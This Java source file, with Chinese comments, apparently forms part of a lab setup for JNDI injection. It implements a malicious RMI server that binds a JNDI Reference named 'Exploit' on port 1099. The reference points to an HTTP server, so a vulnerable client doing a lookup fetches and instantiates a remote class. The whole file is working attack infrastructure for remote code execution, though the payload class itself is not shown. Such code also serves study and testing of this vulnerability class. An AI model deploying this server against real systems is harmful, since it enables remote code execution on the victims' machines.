package org.example.jndi.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.text.MessageFormat;

public class RMIServer {
    private static final Integer rmiServerPort = 1099;
    private static final String httpServerAddress = "127.0.0.1";
    private static final Integer httpServerPort = 80;

    public static void main(String[] args) throws Exception {
        // 工程地址，目的是让 JNDI 加载位于此处的类文件
        String factoryLocation = MessageFormat.format("http://{0}:{1}/", httpServerAddress, httpServerPort + "");
        // 创建 Registry
        Registry registry = LocateRegistry.createRegistry(rmiServerPort);
        // 创建 JNDI 的引用
        // className 远程对象的类名称，不能为null
        // factory 加载类成功后要实例化的类名称
        // factoryLocation 提供类文件的地址，为null时从本地加载
        Reference reference = new Reference("Exploit", "Exploit", factoryLocation);
        // 将 JNDI引用 包装为 RMI 可注册的类
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        // 将类信息注册到 Registry
        registry.bind("Exploit", referenceWrapper);
        System.out.println("[*] RMI server listening on: 0.0.0.0:" + rmiServerPort);
    }
}